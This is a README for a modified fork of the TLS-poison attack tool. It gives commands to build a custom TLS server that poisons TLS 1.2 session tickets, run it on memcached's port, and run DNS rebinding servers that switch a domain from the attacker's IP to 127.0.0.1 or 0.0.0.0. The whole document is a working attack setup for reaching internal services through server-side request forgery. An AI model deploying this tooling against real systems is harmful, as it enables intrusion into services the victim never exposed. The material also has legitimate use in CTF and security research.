# TLS Poison
Modified from https://github.com/jmdx/TLS-poison. Compared to the original repo, I have added some modified tools and a feature. The modified tools are shown below. 

Now we can use session ticket to resume session. You could set the `ticket_payload` in the redis to try TLS 1.2 session ticket resumption poison.



###	TLS Server

```bash
# Install dependencies
sudo apt install git redis
git clone https://github.com/jmdx/TLS-poison.git
# Install rust:
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
cd TLS-poison/client-hello-poisoning/custom-tls
# There will definitely be warnings I didn't clean up :)
cargo build
# Test out the server:
target/debug/custom-tls -p 11211 --verbose --certs /root/tls/fullchain.pem --key /root/tls/privkey.pem http
# (In another terminal to verify setup)
curl -kv https://localhost:8443
```

If you use the proxy tool, you should change the port to 11210.


```
target/debug/custom-tls -p 11210 --verbose --tickets --certs /path/to/fullchain.pem --key /path/to/privkey.pem --protover 1.2 http
```



###  DNS Tool

```bash
sudo apt install python3 python3-pip
git clone https://github.com/jmdx/TLS-poison.git
cd TLS-poison/client-hello-poisoning/custom-dns
pip3 install -r requirements.txt
# $DOMAIN: The domain you own where you will set up NS records
# $TARGET_IP: Likely 127.0.0.1, though you can set this to be some box 
#   netcat listening, for early phases of testing.
# $INITIAL_IP: The IP of the box with custom-tls
sudo python3 alternate-dns.py $DOMAIN,$TARGET_IP -b 0.0.0.0 -t $INITIAL_IP -d 8.8.8.8
# If you get "OSError: address already in use", you can do the following
# to stop systemd-resolved.  This might mess up lots of things outside of
# custom-dns, but if it's on a dedicated VM, you're probably okay.
# A better way is to add DNSStubListener=no to /etc/systemd/resolved.conf
sudo systemctl stop systemd-resolved
# Finally, to verify, run the following a few times to see it alternating:
dig @localhost $DOMAIN
```

I have changed the original dns rebinding method. It will return your TLS server IP in the first 10s,  return 127.0.0.1 thereafter.

If you want to change the interval time, edit client-hello-poisoning/custom-dns/alternate-dns.py#96.

```python
return d[1] if (time() - start > 10) else args.TARGET
```



###  Proxy Tool

```
python2 proxy.py
```

Forward port 11211 to local port 11210.



###	New DNS Tool

```
python3 alternate-dns.py example.com --ip x.x.x.x --mode static_zero
Usage:
     --ip 					 Your vps ip or an ip which you want the domain point to.
     --static_zero   In this mode, the tool will return two A records in a DNS query. One of the records is your vps ip, the other one is 0.0.0.0.
     --rebinding		 In this mode, the tool will only return an A records in a DNS query. But it will randomly return 127.0.0.1 or the ip you set. Similar like the original alternate-dns tool.
```

